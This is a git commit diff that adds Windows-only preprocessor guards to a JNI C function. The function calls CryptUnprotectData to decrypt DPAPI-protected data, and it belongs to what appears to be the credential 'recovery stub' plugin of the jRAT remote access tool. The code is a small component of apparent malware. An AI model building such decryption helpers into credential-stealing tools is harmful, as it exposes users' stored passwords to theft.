bc85f1f01c7a48fd9c4bead385c112f0db05031d
redpois0n <red@cmail.nu>
2016-01-09 10:19:29 +0100

    Only include win code on windows

--- natives/src/NativeUtils.c
+++ natives/src/NativeUtils.c
@@ -1,8 +1,11 @@
 #include "jrat_plugin_recovery_stub_NativeUtils.h"
 
-#include <windows.h>
+#ifdef _WIN32
+#	include <windows.h>
+#endif
 
 JNIEXPORT jbyteArray JNICALL Java_jrat_plugin_recovery_stub_NativeUtils_cryptUnprotectData(JNIEnv * env, jclass clazz, jbyteArray bytes) {
+#ifdef _WIN32
 	jbyte * data = (*env)->GetByteArrayElements(env, bytes, NULL);
 
 	int length = (*env)->GetArrayLength(env, bytes);
@@ -12,11 +15,16 @@ JNIEXPORT jbyteArray JNICALL Java_jrat_plugin_recovery_stub_NativeUtils_cryptUnp
 
 	CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out);
 
-	jbyteArray buff	= (*env)->NewByteArray(env, out.cbData);
+	jbyteArray buff = (*env)->NewByteArray(env, out.cbData);
 	(*env)->SetByteArrayRegion(env, buff, 0, out.cbData, out.pbData);
 
 	LocalFree(out.pbData);
 	LocalFree(in.pbData);
 
 	return buff;
+#else
+
+	return NULL;
+
+#endif
 }
